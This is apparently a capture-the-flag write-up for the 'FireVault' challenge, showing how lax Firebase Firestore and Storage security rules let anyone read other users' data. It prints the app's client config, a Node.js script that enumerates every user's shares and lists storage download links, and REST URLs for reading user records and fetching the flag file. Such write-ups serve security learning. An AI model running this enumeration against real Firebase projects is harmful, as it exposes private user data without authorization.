# FireVault - Writeup

This challenge requires us to abuse broken security rules protecting Firebase Firestore and Firebase Storage.

After playing around with the app a bit, it should be pretty clear that the flag is going to be located in some share somewhere.

We can query firestore and storage via the javascript SDK. If we dig around in the client source via chrome debugger we will be able to find the firebase config, which is required by the client side javascript sdk.

```js
{
  apiKey: "AIzaSyAHI0WKAEz6V_LXjQEDy7jaPG5sVN0UYss",
  authDomain: "firevault-1a5bc.firebaseapp.com",
  projectId: "firevault-1a5bc",
  storageBucket: "firevault-1a5bc.appspot.com",
  messagingSenderId: "459820124037",
  appId: "1:459820124037:web:6c173f913aac55394ca6ec",
  measurementId: "G-5RT5JH07YK",
}
```

We can then use this config via the SDK to write an enumeration script and retrieve the flag.

This solve script was written by Jesse. My previous one stopped working for some reason, you can find it in `solve/old_solve.js`. I think Google disallowed usage of the admin api with normal client credentials. Someone let me know if you know why!

```js
const { initializeApp  } = require('firebase/app');
const { getFirestore, collection, getDocs  } = require('firebase/firestore');

const firebaseConfig ={
    apiKey: 'AIzaSyAHI0WKAEz6V_LXjQEDy7jaPG5sVN0UYss',
    authDomain: 'firevault-1a5bc.firebaseapp.com',
    projectId: 'firevault-1a5bc',
    storageBucket: 'firevault-1a5bc.appspot.com',
    messagingSenderId: '459820124037',
    appId: '1:459820124037:web:6c173f913aac55394ca6ec',
    measurementId: 'G-5RT5JH07YK'
};

const filePath = "https://firebasestorage.googleapis.com/v0/b/firevault-1a5bc.appspot.com/o/"

const app = initializeApp(firebaseConfig)

const db = getFirestore(app);


async function enumUsers(db) {
    const userCol = collection(db, 'users');
    const userSnapshots = await getDocs(userCol);
    userSnapshots.forEach((snap) => {
        enumShares(db, snap.id)
    })
}

async function enumShares(db, id) {
    const shareCol = collection(db, `users/${id}/shares`);
    const shareSnapshots = await getDocs(shareCol);
    const shareList = shareSnapshots.docs.map(doc => doc.data());
    console.log("Files in share for user ID: " + id)
    for(let i = 0; i < shareList.length; i++) {
        if ("files" in shareList[i]) {
            for(let j = 0; j < shareList[i]["files"].length; j++) {
                console.log(filePath + encodeURIComponent(shareList[i]["files"][j].path) + "?alt=media")
            }
        }
    }
}

enumUsers(db)
```

Alernatively this could be done solely via a brower by visiting the following urls and looking around.
You would be able to find these urls by either reading the firebase docs or making your own free firebase project and looking around.

* List admin shares (figure out that there is a /shares collection)

  https://content-firestore.googleapis.com/v1beta1/projects/firevault-1a5bc/databases/(default)/documents/users/

* Show the metadata for a particular user:

  https://content-firestore.googleapis.com/v1beta1/projects/firevault-1a5bc/databases/(default)/documents/users/{uid}

* List the shares of a particular user:

  https://content-firestore.googleapis.com/v1beta1/projects/firevault-1a5bc/databases/(default)/documents/users/{uid}/shares

* List the metadata for a specific share:

  https://content-firestore.googleapis.com/v1beta1/projects/firevault-1a5bc/databases/(default)/documents/users/{uid}/shares/{shareid}

* Spot the file path for the flag in firebase storage from the first user

* Download the flag from storage

  https://firebasestorage.googleapis.com/v0/b/firevault-1a5bc.appspot.com/o/87EYqlu85vX2dUHfwmlkFFOVMQv1%2Fflag.txt?alt=media
